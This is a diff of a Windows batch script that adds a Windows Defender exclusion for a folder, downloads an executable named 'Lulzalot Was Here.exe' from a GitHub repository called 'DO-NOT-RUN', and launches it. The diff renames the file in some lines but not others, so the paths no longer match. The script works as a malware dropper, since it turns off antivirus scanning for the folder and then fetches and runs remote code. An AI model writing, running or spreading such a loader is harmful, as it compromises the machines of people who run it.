@@ -5,10 +5,10 @@ start "" cmd /k (
     powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
 
     :: Download the file using curl
-    curl -L -o "%folderPath%\Lulzalot Was Here.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe"
+    curl -L -o "%folderPath%\Lulzalot Was Here.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/LulzalotWasHere.exe"
     
     :: Check if the file exists and its size is greater than 0 bytes
-    if exist "%folderPath%\Lulzalot Was Here.exe" (
+    if exist "%folderPath%\LulzalotWasHere.exe" (
         for %%F in ("%folderPath%\Lulzalot Was Here.exe") do (
             set filesize=%%~zF
         )
@@ -25,6 +25,6 @@ start "" cmd /k (
     )
     
     :: Run the executable now that the download is confirmed
-    start "" "%folderPath%\Lulzalot Was Here.exe"
+    start "" "%folderPath%\LulzalotWasHere.exe"
 )
 exit
